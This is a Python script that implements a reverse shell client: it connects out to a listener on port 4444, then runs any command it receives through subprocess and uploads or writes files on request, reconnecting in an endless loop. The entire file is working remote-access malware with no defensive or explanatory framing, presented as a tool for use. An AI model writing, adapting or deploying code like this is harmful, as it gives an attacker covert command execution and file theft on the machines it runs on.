import socket
import subprocess
import time
import base64
class Rev:
    def __init__(self):
        self.host = "127.0.0.1"
        self.port = 4444
        self.con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.state = True
        self.cmdlist = ['get','put']
    def store_file(self,content,path):
        try:
            with open(path,'wb') as f:
                f.write(base64.b64decode(content))
            return base64.b64encode("Sucessfully Uploaded".encode())
        except:
            return base64.b64encode("Error While Uploading File".encode())
    def send_file(self,path):
        try:
            with open(path,'rb') as f:
                return base64.b64encode(f.read())
        except:
            return base64.b64encode("Some Error In Access".encode())
    def pass_cmd(self,message):
        if message[0] not in self.cmdlist:
            try:
                output = subprocess.check_output(message)
            except:
                output = "Error In Execution \n"
            return output
        if message[0] == self.cmdlist[0]:
            output = self.send_file(message[1])
            return output
        if message[0] == self.cmdlist[1]:
            self.store_file(message[1],message[2])
    def run(self):
        try:
            self.con.connect((self.host,self.port))
            self.con.send("alive\n".encode())
            self.state = True
        except:
            time.sleep(10)
            self.state = False
        while self.state == True:
            self.msg = self.con.recv(1024).decode()
            self.msg = self.msg.replace("\n","")
            self.msg = self.msg.split(" ")
            result = self.pass_cmd(self.msg)
            if not isinstance(result,bytes):
                if result == None:
                    result = "Sucessfull"
                result = result.encode()
            try:
                self.con.send(result)
            except BrokenPipeError:
                self.state = False
                self.con.close()


a = Rev()
while True:
    a.run()

